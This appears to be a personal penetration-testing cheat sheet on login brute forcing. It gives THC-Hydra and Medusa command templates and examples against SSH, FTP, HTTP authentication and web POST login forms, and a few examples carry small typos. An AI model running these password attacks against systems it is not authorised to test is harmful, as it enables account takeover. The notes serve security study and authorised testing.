---
Primary_category: "[[PASSWORD ATTACKS]]"
title: "LOGIN BRUTE FORCING"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[PASSWORD ATTACKS]]

#### *SSH Authentication*

##### *THC-Hydra*

> ***[THC-Hydra](https://github.com/vanhauser-thc/thc-hydra)***

```bash
hydra -v -t <THREADS> -U <USER_LIST> -P <PASSWD_LIST> ssh://<TARGET>:<PORT>
```

> [!DANGER]- *e.g.*
>
> ```bash
> hydra -v t 64 -U user.list -P password.list ssh://10.10.10.5:2222
> ```
>

```bash
medusa -t <THREADS> -h <TARGET> -n <PORT> -U <USER_LIST> -P <PASSWD_LIST> -M ssh
```

> [!DANGER]- *e.g.*
>
> ```bash
> medusa -t 8 -h 10.10.10.5 -n 2222 -U user.list -P password.list -M ssh
> ```
>

---

#### *FTP Authentication*

##### *THC-Hydra*

> ***[THC-Hydra](https://github.com/vanhauser-thc/thc-hydra)***

```bash
hydra -v -t <THREADS> -U <USER_LIST> -P <PASSWD_LIST> ftp://<TARGET>:<PORT>
```

> [!DANGER]- *e.g.*
>
> ```bash
> hydra -v t 64 -U user.list -P password.list ftp://10.10.10.5:2121
> ```
>

##### *Medusa*

> ***[Medusa](https://github.com/jmk-foofus/medusa)***

```bash
medusa -t <THREADS> -h <TARGET> -n <PORT> -U <USER_LIST> -P <PASSWD_LIST> -M ftp
```

> [!DANGER]- *e.g.*
>
> ```bash
> medusa -t 8 -h 10.10.10.5 -n 2121 -U user.list -P password.list -M ssh
> ```
>

---

#### *HTTP Authentication*

##### *THC-Hydra*

> ***[THC-Hydra](https://github.com/vanhauser-thc/thc-hydra)***

```bash
hydra -v -t <THREADS> -L <USER_LIST> -P <PASSWD_LIST> <TARGET> -s <HTTP_PORT> http-get <WEB_PATH>
```

> [!DANGER]- *e.g.*
>
> ```bash
> hydra -v -t 64 -L user.list -P password.list www.domain.com http-get /
> ```
>

##### *Medusa*

> ***[Medusa](https://github.com/jmk-foofus/medusa)***

```bash
medusa -v -t <THREADS> -h <TARGET> -n <PORT> -U <USER_LIST> -P <PASSWD_LIST> -M http -m GET
```

> [!DANGER]- *e.g.*
>
> ```bash
> medusa -v -t 2 -h www.domain.com -n 8080 -U user.list -P password.list -M http -m GET
> ```
>

---

#### *Web Login Form - HTTP POST Request*

##### *THC-Hydra*

> ***[THC-Hydra](https://github.com/vanhauser-thc/thc-hydra)***

```bash
hydra -v -t <THREADS> -L <USER_LIST> -P <PASSWD_LIST> <TARGET> http-post-form "/<PATH>:<PARAM1>=^USER^&<PARAM2>=^PASS^:<CONDITION_STRING>"
```

> [!DANGER]- *e.g.*
>
> ```bash
> hydra -v -t 64 -L user.list -P password.list www.domain.com http-post-form '/login:user=^USER^&pass=^PASS^:S=302' # S → Success condition
> ```
>

> [!DANGER]- *e.g.*
>
> ```bash
> hydra -v -t 64 -L user.list -P password.list www.domain.com http-post-form '/login:user=^USER^&pass=^PASS^:F=Invalid credentials' # F → Failing condition
> ```
>